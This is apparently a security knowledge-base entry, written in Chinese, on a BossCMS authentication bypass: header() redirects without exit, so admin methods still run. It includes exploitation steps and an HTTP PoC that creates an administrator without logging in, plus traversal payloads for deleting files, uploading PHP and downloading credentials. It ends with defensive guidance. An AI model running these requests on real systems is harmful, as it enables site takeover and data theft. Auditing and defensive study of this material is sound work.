---
id: web-generic-auth-bosscms-admin-init-header-no-exit
title: BossCMS admin::init 未登录仅 header 跳转不 exit/die：请求继续执行后台方法，未授权添加管理员/删文件/上传
type: scenario
domain: web
path: web/generic/auth
technique: bosscms-admin-init-header-redirect-no-exit-auth-bypass
aliases:
- BossCMS 未授权访问
- BossCMS 权限校验逻辑缺陷
- header 跳转未 exit 鉴权绕过
- admin.class.php init 无 die
- BossCMS 添加管理员
tags:
- web
- php
- bosscms
- cms
- auth-bypass
- missing-exit
- unauthorized
- privilege-escalation
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V638
  verified_at: '2026-11-13T02:11:54+08:00'
  notes: 已对照原文与截图核对：admin::init 未登录仅 header 跳转无 exit/die（无会话分支无 die，die 在带非法会话的 else 分支）；未授权 manager add 创建 level=2 管理员、未授权修改允许上传类型/上传/删文件均属实。PoC 措辞已注明 form-urlencoded 等价性未验证、建议照原文 multipart 带 permit JSON；变体 path 已统一为 upload/../x.txt；affected_versions 已 clear（原文仅安装环境版本）。未复跑。
---

## 一句话结论

BossCMS 的 `system/basic/class/admin.class.php::init()` 在读取不到 `manager` 会话时只执行 `header('Location: .../login')` 跳转登录页，没有 `exit/die` 终止脚本，PHP 会继续执行当前路由指向的功能方法；因此不带任何会话即可调用所有继承 admin 的后台模块——未授权 POST `mold=manager&part=manager&func=add` 直接创建 level=2 管理员，随后用新账号登录接管后台，未授权调用 ueditor 的删除/上传、备份下载等同理成立。

## 原理

- **header() 不等于终止**：`header('Location: ...')` 只是把 302 响应头加入待发送列表，PHP 解释器继续向下执行；浏览器随后跳转到登录页，但服务端在当前请求里已经把业务方法执行完（写库、删文件、落盘上传）。
- **代码结构**：`admin::init()` 中 `$manager = session::get('manager'); if(empty($manager)){ if(!defined('IS_LOGIN')){ header('Location: '.url::mpf('mold'=>'login','part'=>'login','func'=>'init')); } } else { ...校验... } $this->authorize();`——无会话分支只有 `header()`，没有 return/exit/die；只有带非法会话的分支里才出现 `die('Login')`。
- **路由装载顺序**：`load_class()` 先加载父类 admin 并执行其 `init()`（鉴权检查），随后再实例化并调用目标 part 类的方法；鉴权检查“只跳转不退出”后，目标方法照常执行。
- **危害落点**：`system/admin/manager/manager.class.php` 的 `add/edit/delete` 参数全部来自请求，`add` 未校验调用者身份即写 `manager` 表；ueditor `delete`/`uploadfile` 与 backup `download` 也因同一原因可在未登录状态调用。

## 触发条件

- 目标为 BossCMS，后台模块继承 `admin` 类（`/admin/?mold=...&part=...&func=...` 或 `/system/extend/...` 下继承 admin 的控制器）。
- 请求不带有效 `manager` 会话（或伪造失败为空），走 `empty($manager)` 分支。
- 目标功能方法自身没有额外的权限判断（manager 的 add 即如此）。

## 利用步骤

1. 不登录，直接构造后台功能请求，例如 `POST /admin/?mold=manager&part=manager&func=add`。
2. 提交新管理员字段（`username`、`password`、`passwords`、`level=2`、`open=1`；原文请求另带 `permit1/permit2/permit3` 权限 JSON 与空的 image/alias/email/phone 字段）。
3. 服务端返回 302（跳登录页）但用户已写入数据库；用新账号/密码登录后台，权限为管理员。
4. 同一缺陷下可未授权调用 ueditor `action=delete` 删任意文件、`action=uploadfile` 上传文件、备份 `func=download` 下载任意文件；若要清理痕迹可继续用 manager 的 edit/delete。

## PoC

原文请求为 multipart，核心字段如下（原文未验证 form-urlencoded 等价性，实际以目标实现的参数读取方式为准，复现时建议照原文 multipart 构造并带上 `permit1`/`permit2`/`permit3` 权限 JSON）：

```http
POST /admin/?mold=manager&part=manager&func=add HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=attacker&password=Passw0rd&passwords=Passw0rd&level=2&open=1
```

响应为 302 跳转登录页（`header('Location: ...mold=login...')`）——但新管理员已创建：

```text
HTTP/1.1 302 Found
Location: /admin/?mold=login&part=login&func=init
```

随后 `POST /admin/?mold=login&part=login&func=init` 用 `attacker/Passw0rd` 登录成功，页面显示管理员权限。

## 变体与关联

- **未授权任意文件删除**：`POST /system/extend/ueditor/php/controller.php?action=delete` + `path=upload/../x.txt`，302 但文件被删（见 `web-generic-file-inclusion-bosscms-ueditor-delete-path-traversal-unlink`）。
- **未授权文件上传**：同一控制器 `action=uploadfile` 在允许类型含 `.php` 时可直接落 PHP（见 `web-generic-file-upload-bosscms-ueditor-upload-extension-code-php`）。
- **未授权下载**：`/admin/?mold=safe&part=backup&func=download&id=../../basic/ini/mysql.ini.php`。
- 与禅道 `EndResponseException` 被捕获后继续执行同类：鉴权流程“以为已经终止、实际继续执行”；本例是 `header()` 后缺 `exit`。

## 检测与防御

- 未登录/无权限时 `header('Location: ...'); exit;`（或 `die()`），所有鉴权分支都必须终止脚本。
- 用统一中间件在业务方法执行前拦截，不依赖页面跳转；后台接口同时对请求方法和 CSRF token 校验。
- 审计所有“`header(` 后无 `exit/die/return`”的鉴权代码；manager 的 add/edit/delete 增加服务端权限与参数校验。
- 监控未带会话却返回 302 但产生写操作的请求（如新增管理员、删除文件）；告警 manager 表异常新增。
